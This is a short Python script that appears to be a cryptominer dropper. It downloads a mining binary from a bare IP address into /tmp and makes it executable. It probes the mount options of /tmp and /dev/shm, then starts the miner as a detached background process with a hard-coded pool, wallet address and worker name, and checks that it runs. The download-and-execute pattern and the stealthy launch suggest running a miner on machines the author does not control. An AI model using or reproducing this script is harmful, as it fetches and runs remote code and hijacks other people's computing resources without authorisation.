import subprocess, os, stat, urllib.request

DST = '/tmp/turbo-pearl-miner'
WALLET = 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'
POOL = 'stratum+tcp://sg1.alphapool.tech:5566'
URL = 'http://151.247.219.40:8000/alpha-miner-arm64'

# Download to /tmp
urllib.request.urlretrieve(URL, DST)
os.chmod(DST, 0o755)
print(f'Downloaded:{os.path.getsize(DST)}')

# Check mount options
r = subprocess.run(['mount'], capture_output=True, text=True)
for line in r.stdout.split(chr(10)):
    if '/dev/shm' in line or '/tmp' in line:
        print('MOUNT:' + line[:80])

# Start from /tmp
subprocess.Popen([DST, '--pool', POOL, '--address', WALLET, '--worker', 'GB10_253'], 
                 stdout=open('/tmp/miner.log', 'w'),
                 stderr=subprocess.STDOUT,
                 start_new_session=True)
import time
time.sleep(5)

r = subprocess.run(['pgrep', '-a', 'turbo-pearl'], capture_output=True, text=True)
if r.stdout.strip():
    print('RUNNING:' + r.stdout.strip()[:60])
else:
    with open('/tmp/miner.log') as f:
        print('LOG:' + f.read()[:200])
